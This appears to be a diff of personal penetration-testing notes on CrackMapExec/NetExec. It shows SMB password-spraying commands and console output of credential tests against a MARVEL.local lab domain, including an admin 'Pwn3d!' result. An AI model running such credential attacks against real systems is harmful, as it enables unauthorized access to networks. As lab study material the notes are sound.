@@ -1,6 +1,5 @@
 - [Installation](#installation)
-
-- 
+- [Test Credential](#test-credential)
 
 ## [Installation](#installation-1)
 ```sh
@@ -16,17 +15,22 @@ cme smb $ip -u users.txt -p sT333ve2
 cme smb $ip -u users.txt -p sT333ve2 --continue-on-success
 ```
 
-### [Test Credential](#test-credential)
+### [Test Credential](#test-credential-1)
 ```sh
 PS C:\Users\fcastle> whoami
 marvel\fcastle
 PS C:\Users\fcastle> .\nxc.exe smb 10.1.1.6 -u fcastle -p Password1
 SMB         10.1.1.6        445    PUNISHER         [*] Windows 10.0 Build 19041 x64 (name:PUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
 SMB         10.1.1.6        445    PUNISHER         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
-PS C:\Users\fcastle>
+
 PS C:\Users\fcastle> .\nxc.exe smb 10.1.1.6 -u pparker -p Password2
 SMB         10.1.1.6        445    PUNISHER         [*] Windows 10.0 Build 19041 x64 (name:PUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
 SMB         10.1.1.6        445    PUNISHER         [+] MARVEL.local\pparker:Password2
+PS C:\Users\fcastle>
+
+PS C:\Users\fcastle> .\nxc.exe smb 10.1.1.6 -u pparker -p Wr0n9
+SMB         10.1.1.6        445    PUNISHER         [*] Windows 10.0 Build 19041 x64 (name:PUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
+SMB         10.1.1.6        445    PUNISHER         [-] MARVEL.local\pparker:Wr0n9 STATUS_LOGON_FAILURE
 PS C:\Users\fcastle>
 ```
 
